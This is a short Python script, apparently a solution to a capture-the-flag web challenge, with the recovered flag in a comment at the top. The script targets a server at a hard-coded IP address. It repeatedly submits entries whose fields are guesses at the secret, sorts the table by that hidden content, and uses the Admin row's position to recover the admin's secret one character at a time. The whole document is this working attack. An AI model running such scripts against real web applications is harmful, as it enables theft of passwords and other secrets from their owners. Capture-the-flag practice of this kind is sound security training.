#FUSec{8f85472570bb6fc9808e889069bda7ea}

import requests
import string
import re
from bs4 import BeautifulSoup

flag = 'FUSec{'

url1 = 'http://34.80.117.212:8300/create_wish'
url2 = 'http://34.80.117.212:8300/sort_table'
data1 = {
    "name" : "",
    "description" : " ",
    "wish" : "",
    "password" : ""
}
data2 = {
   "order_by" : "CONTENT",
   "asc_or_desc" : "DESC"
}

s = string.ascii_lowercase + string.digits
while(1):
    rq = requests.Session()
    for i in s:
        data1["name"] = i
        data1["password"] = data1["wish"] = flag + i
        rq.post(url1, data = data1)

    html = rq.post(url2, data = data2, timeout=300).text
    soup = BeautifulSoup(html, 'html.parser')
    a = []
    for i in soup('tr'):
        lst = []
        lst = re.findall(r'>(.*?)<', i.__str__())
        for j in range(2,len(lst)-1,6):
            a.append(lst[j])
    #print(a)
    flag += a[a.index("Admin")+1]
    print(flag)
    if len(flag) == 38:
        print(flag +'}')
        break
        
